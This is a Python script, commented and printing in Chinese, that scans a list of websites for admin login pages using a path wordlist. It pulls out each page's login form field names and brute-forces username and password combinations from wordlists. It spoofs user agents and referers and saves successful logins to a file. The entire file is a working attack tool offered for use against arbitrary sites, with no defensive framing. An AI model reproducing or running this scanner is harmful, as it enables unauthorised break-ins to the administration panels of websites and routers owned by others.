# -*- coding:utf-8 -*-
import random
import time
import re
import requests
import os
import threading
import queue
from bs4 import BeautifulSoup as bp
from urllib import parse
requests.packages.urllib3.disable_warnings()
timeout = 10
q = queue.Queue()


def headers(refer):
    REFERERS = [
        "https://www.baidu.com",
        "http://www.baidu.com",
        "https://www.google.com.hk",
        "http://www.so.com",
        "http://www.sogou.com",
        "http://www.soso.com",
        "http://www.bing.com",
    ]

    headerss = [
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
        "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"]
    if refer:
        pass
    else:
        refer = random.choice(REFERERS)
    headers = {
        'User-Agent': random.choice(headerss),
        'Accept': 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Cache-Control': 'max-age=0',
        'referer': refer,
        'Accept-Charset': 'GBK,utf-8;q=0.7,*;q=0.3',
    }
    return headers


def get_user_password_name(url):
    try:
        r = requests.get(url=url, headers=headers(url), timeout=timeout, verify=False)
        users = ''
        bs = bp(r.content, 'html.parser')
        username = bs.find_all('input', type="text")

        if len(username) == 1 or len(username) == 2:
            users = username[0]['name']

        if not users:
            for n in username:
                if 'user' in n['name'].lower():
                    users = n['name']
                    break
                if 'name' in n['name'].lower():
                    users = n['name']
                    break
                if 'account' in n['name'].lower():
                    users = n['name']
                    break

        password = bs.find_all('input', type="password")

        if len(password) == 1:
            try:
                passs = password[0]['name']
            except:
                passs = 'password'
        else:
            passs = 'password'
        return users, passs
    except Exception as e:
        return None


def scan_admin(urls, manage_ways):
    # 接收参数是两个列表
    # 分别是网址列表 和 后台路径
    for u in urls:
        for m in manage_ways:
            url = parse.urljoin(u,m)
            print('扫描网址后台管理地址:{}'.format(url))
            try:
                res = requests.get(url=url, headers=headers(u), timeout=timeout)
                encoding = requests.utils.get_encodings_from_content(res.text)[0]
                r = res.content.decode(encoding, 'replace')
                if 'user' in r and 'pass' in r:
                    q.put(url)
                    break
                if '用户名' in r and '密码' in r:
                    q.put(url)
                    break
                if '登陆' in r and '密码' in r:
                    q.put(url)
                    break
                if '管理员登陆' in r:
                    q.put(url)
                    break
                if '后台管理登陆' in r:
                    q.put(url)
                    break
                if '管理员' in r and '密码' in r:
                    q.put(url)
                    break
                if '登录密码' in r:
                    q.put(url)
                    break
                if '账号' in r and '密码' in r:
                    q.put(url)
                    break
                if '帳號' in r and '密碼' in r:
                    q.put(url)
                    break
            except Exception as e:
                print(e)


def post_data(url, username, password, usernames, passwords):
    time.sleep(3)
    data = {username: usernames,
            password: passwords}
    print('尝试登陆网址:{}|:账号:{}|密码:{}|'.format(url,usernames,passwords))
    try:
        r = requests.post(url=url, data=data, timeout=timeout)
        encoding = requests.utils.get_encodings_from_content(r.text)[0]
        res = r.content.decode(encoding, 'replace')
        return res

    except:
        return None


def login_success_check(content):
    if '登陆成功' in content:
        return True
    if 'success' in content:
        return True
    if '退出登陆' in content:
        return True
    if '账号管理' in content:
        return True
    if '账号列表' in content:
        return True
    if '用户管理' in content:
        return True
    if '个人资料' in content:
        return True
    if '账号管理' in content:
        return True
    if '欢迎您' in content:
        return True
    if '待处理' in content:
        return True
    if '修改密码' in content:
        return True
    if '退出系统' in content:
        return True
    if '登陆时间' in content:
        return True
    if '登陆IP' in content:
        return True
    if '安全设置' in content:
        return True
    if '账号绑定' in content:
        return True
    if '退出' in content:
        return True
    if '文章管理' in content:
        return True
    if '消息中心' in content:
        return True
    if '管理员设置' in content:
        return True
    if '欢迎' in content:
        return True
    if '用户中心' in content:
        return True
    if '注销' in content:
        return True
    if '会员列表' in content:
        return True
    if '订单列表' in content:
        return True
    if '<frame frameborder="0" id="frame_navigation"' in content:
        return True
    if 'Router Configuration' in content:
        return True

def scan(usernames,passwords):
    while not q.empty():
        run(usernames,passwords)
def run(usernames,passwords):
        admin_ways = q.get()
        with open('后台列表.txt', 'a+')as a:
            a.write(admin_ways + '\n')
        print('发现网址后台管理地址:{}'.format(admin_ways))
        users_and_passs = get_user_password_name(admin_ways)
        if users_and_passs != None:
            print('成功提取到后台账号密码登入点')
            for u in usernames:
                for p in passwords:
                    post_user_name = post_data(url=admin_ways, username=users_and_passs[0],
                                               password=users_and_passs[1], usernames=u, passwords=p)
                    if post_user_name != None:
                        print('尝试登陆，检测登陆结果')
                        res = login_success_check(post_user_name)
                        if res == True:
                            print('登陆成功')
                            success = admin_ways + '|' + u + '|' + p
                            with open('success.txt','a+')as a:
                                a.write(success + '\n')
                            return
                        else:
                            print('登录失败')



if __name__ == '__main__':
    urls = input('Input urls:')
    url_ways = input('Input Dict:')
    usernames = input('Input Username:')
    passwords = input('Input Password:')

    urls = list([x.strip() for x in open(urls,'r').readlines()])
    url_ways = list([x.strip() for x in open(url_ways,'r').readlines()])
    usernames = list([x.strip() for x in open(usernames,'r').readlines()])
    passwords = list([x.strip() for x in open(passwords,'r').readlines()])

    t1 = threading.Thread(target=scan_admin,args=(urls,url_ways))
    t2 = threading.Thread(target=scan,args=(usernames,passwords))
    t1.start()
    t2.start()
    # scan_admin(urls,url_ways)
    #
    # res = scan(usernames, passwords)
    # print(res)
